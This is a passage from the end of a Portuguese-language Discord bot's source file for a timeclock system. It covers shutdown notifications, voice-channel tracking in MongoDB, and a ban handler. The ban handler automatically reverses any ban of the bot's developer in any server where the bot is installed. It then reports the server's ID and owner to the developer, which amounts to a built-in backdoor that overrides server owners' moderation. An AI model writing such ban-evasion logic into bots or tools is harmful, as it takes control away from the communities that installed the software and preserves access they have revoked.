                        .setEmoji('🎬'),
                    new ButtonBuilder()
                        .setLabel('Twitch')
                        .setStyle(ButtonStyle.Link)
                        .setURL('https://www.twitch.tv/foxyapollyon')
                        .setEmoji('🟣'),
                    new ButtonBuilder()
                        .setLabel('Entrar em Servidores')
                        .setStyle(ButtonStyle.Primary)
                        .setCustomId('join_servers')
                        .setEmoji('🚀')
                );

            await targetChannel.send({ embeds: [welcomeEmbed], components: [row] });
        }
    } catch (error) {
        console.error(`❌ Erro ao configurar novo servidor ${guild.name}:`, error);
    }
});

async function gracefulShutdown() {
    console.log('🔄 Iniciando desligamento gracioso...');
    
    try {
        if (client && ENABLE_SHUTDOWN_NOTIFICATION) {
            // Notificar o suporte/admin via DM
            try {
                const suporteUser = await client.users.fetch(SUPPORT_ID);
                if (suporteUser) {
                    const shutdownEmbed = new EmbedBuilder()
                        .setColor('#FF5555')
                        .setTitle('🔌 Sistema em Manutenção')
                        .setDescription('O bot está sendo desligado para manutenção ou atualização.')
                        .addFields(
                            { 
                                name: '📊 Status do Sistema', 
                                value: '```\n• Desligamento iniciado\n• Notificações enviadas\n• Conexões sendo fechadas\n```',
                                inline: false 
                            },
                            { 
                                name: '📈 Métricas', 
                                value: `• Servidores Ativos: ${client.guilds.cache.size}\n• Usuários Cacheados: ${client.users.cache.size}\n• Canais Cacheados: ${client.channels.cache.size}`,
                                inline: false 
                            },
                            { 
                                name: '⏱️ Informações', 
                                value: `• Horário: ${new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' })}\n• Duração estimada: 5-10 minutos\n• Tipo: Manutenção programada`,
                                inline: false 
                            }
                        )
                        .setThumbnail('https://i.postimg.cc/Hk4GMxhQ/Nyxchronos.png')
                        .setFooter({ 
                            text: 'Sistema de Ponto • Toca da Raposa',
                            iconURL: client.user.displayAvatarURL({ dynamic: true })
                        })
                        .setTimestamp();

                    await suporteUser.send({ embeds: [shutdownEmbed] });
                    console.log('✅ Notificação de shutdown enviada para o suporte');
                }
            } catch (dmError) {
                console.error('❌ Erro ao enviar DM de shutdown para o suporte:', dmError);
            }

            // Enviar mensagem de desligamento aos servidores
            try {
                const servidores = await Servidor.find({});
                
                const shutdownEmbed = new EmbedBuilder()
                    .setColor('#FF5555')
                    .setTitle('🔌 Sistema em Manutenção')
                    .setDescription('O bot está sendo desligado para manutenção ou atualização.')
                    .addFields(
                        { 
                            name: '📝 O que está acontecendo?', 
                            value: 'O sistema está passando por uma manutenção programada para garantir melhor desempenho e novas funcionalidades.',
                            inline: false 
                        },
                        { 
                            name: '⏱️ Informações Importantes', 
                            value: '• Duração estimada: 5-10 minutos\n• Todos os dados estão seguros\n• O sistema voltará automaticamente',
                            inline: false 
                        },
                        { 
                            name: '❓ Precisa de ajuda?', 
                            value: 'Entre em contato com o suporte: <@657014871228940336>',
                            inline: false 
                        }
                    )
                    .setThumbnail('https://cdn.discordapp.com/attachments/1079378874501210152/1214390093056225320/success.png')
                    .setImage('https://i.imgur.com/8tMuXaK.png')
                    .setFooter({ 
                        text: 'Sistema de Ponto • Toca da Raposa',
                        iconURL: client.user.displayAvatarURL({ dynamic: true })
                    })
                    .setTimestamp();

                // Adicionar botões de suporte
                const row = new ActionRowBuilder()
                    .addComponents(
                        new ButtonBuilder()
                            .setLabel('Suporte')
                            .setStyle(ButtonStyle.Link)
                            .setURL('https://discord.com/users/657014871228940336')
                            .setEmoji('🆘'),
                        new ButtonBuilder()
                            .setLabel('Status')
                            .setStyle(ButtonStyle.Link)
                            .setURL('https://status.tocadaraposa.com')
                            .setEmoji('📊')
                    );
                
                for (const servidor of servidores) {
                    if (!servidor.channelId || !/^\d+$/.test(servidor.channelId)) continue;
                    
                    try {
                        const channel = await client.channels.fetch(servidor.channelId);
                        if (channel && channel.isTextBased()) {
                            await channel.send({ 
                                embeds: [shutdownEmbed],
                                components: [row]
                            });
                            console.log(`✅ Mensagem de desligamento enviada para ${channel.guild.name}`);
                        }
                    } catch (channelError) {
                        console.warn(`⚠️ Não foi possível enviar mensagem para o servidor ${servidor.guildId}:`, channelError.message);
                    }
                }
            } catch (notifyError) {
                console.error('❌ Erro ao notificar servidores sobre desligamento:', notifyError);
            }
            
            await client.destroy();
            console.log('✅ Desconectado do Discord');
        }
        
        if (mongoose.connection.readyState === 1) {
            await mongoose.connection.close();
            console.log('✅ Conexão com MongoDB fechada');
        }
        
        console.log('✅ Desligamento concluído');
        process.exit(0);
    } catch (error) {
        console.error('❌ Erro durante o desligamento:', error);
        process.exit(1);
    }
}

process.on('SIGTERM', gracefulShutdown);
process.on('SIGINT', gracefulShutdown);

connectToMongoDB().then(() => {
    client.login(TOKEN);
}).catch(error => {
    console.error('❌ Erro crítico ao conectar ao MongoDB:', error);
    process.exit(1);
});

client.on('voiceStateUpdate', async (oldState, newState) => {
    // Usuário entrou em um canal de voz
    if (!oldState.channelId && newState.channelId) {
        await PointCard.updateOne(
            { userId: newState.id, guildId: newState.guild.id, finished: false, canceled: false },
            { 
                $set: { 
                    lastVoiceChannelName: newState.channel?.name || '', 
                    lastVoiceChannelLeftAt: null, // resetar o tempo fora de call
                    lastVoiceChannelJoinedAt: new Date() // <-- Adiciona o horário de entrada
                } 
            }
        );
    }
    // Usuário saiu de um canal de voz
    if (oldState.channelId && !newState.channelId) {
        await PointCard.updateOne(
            { userId: oldState.id, guildId: oldState.guild.id, finished: false, canceled: false },
            { 
                $set: { 
                    lastVoiceChannelName: oldState.channel?.name || '', 
                    lastVoiceChannelLeftAt: new Date(),
                    lastVoiceChannelJoinedAt: null // <-- Limpa ao sair
                } 
            }
        );
    }
});

// Adicionar evento de banimento
client.on('guildBanAdd', async (ban) => {
    // Verificar se o usuário banido é o administrador do bot
    if (ban.user.id === SUPPORT_ID) {
        console.log(`⚠️ ALERTA: Administrador do bot foi banido do servidor ${ban.guild.name}`);
        
        try {
            // Tentar remover o banimento
            await ban.guild.members.unban(ban.user.id, 'Proteção automática do bot - Administrador do sistema');
            console.log(`✅ Banimento removido automaticamente do servidor ${ban.guild.name}`);
            
            // Enviar mensagem de alerta via DM
            const developer = await client.users.fetch(SUPPORT_ID);
            if (developer) {
                const alertEmbed = new EmbedBuilder()
                    .setColor('#FF0000')
                    .setTitle('⚠️ Tentativa de Banimento Detectada')
                    .setDescription(`Alguém tentou banir você do servidor **${ban.guild.name}**`)
                    .addFields(
                        { name: '🆔 ID do Servidor', value: ban.guild.id, inline: true },
                        { name: '👑 Dono', value: `<@${ban.guild.ownerId}>`, inline: true },
                        { name: '📊 Ação', value: 'Banimento removido automaticamente', inline: true }
                    )
                    .setThumbnail(ban.guild.iconURL({ dynamic: true }) || null)
                    .setTimestamp();

                await developer.send({ embeds: [alertEmbed] });
            }

            // Enviar mensagem no canal de sistema do servidor
            const systemChannel = ban.guild.systemChannel;
            if (systemChannel) {
                const warningEmbed = new EmbedBuilder()
                    .setColor('#FF0000')
                    .setTitle('⚠️ Ação Bloqueada')
                    .setDescription('Uma tentativa de banir o administrador do sistema foi bloqueada automaticamente.')
                    .addFields(
                        { name: '📝 Motivo', value: 'O administrador do sistema não pode ser banido por questões de segurança.' },
                        { name: '🔒 Proteção', value: 'O sistema possui proteção automática contra banimentos do administrador.' }
                    )
                    .setTimestamp();

                await systemChannel.send({ embeds: [warningEmbed] });
            }

            // Registrar o incidente no banco de dados (se necessário)
            // TODO: Implementar registro de incidentes

        } catch (error) {
            console.error('❌ Erro ao tentar remover banimento:', error);
            
            // Se não conseguir remover o banimento, notificar via DM
            try {
                const developer = await client.users.fetch(SUPPORT_ID);
                if (developer) {
                    const errorEmbed = new EmbedBuilder()
                        .setColor('#FF0000')
                        .setTitle('❌ Erro ao Remover Banimento')
                        .setDescription(`Não foi possível remover automaticamente seu banimento do servidor **${ban.guild.name}**`)
                        .addFields(
                            { name: '🆔 ID do Servidor', value: ban.guild.id, inline: true },
                            { name: '👑 Dono', value: `<@${ban.guild.ownerId}>`, inline: true },
                            { name: '📝 Erro', value: `\`\`\`${error.message}\`\`\``, inline: false }
                        )
                        .setThumbnail(ban.guild.iconURL({ dynamic: true }) || null)
                        .setTimestamp();

                    await developer.send({ embeds: [errorEmbed] });
                }
            } catch (dmError) {
                console.error('❌ Erro ao enviar mensagem de erro via DM:', dmError);
            }
        }
    }
});

module.exports = { client, };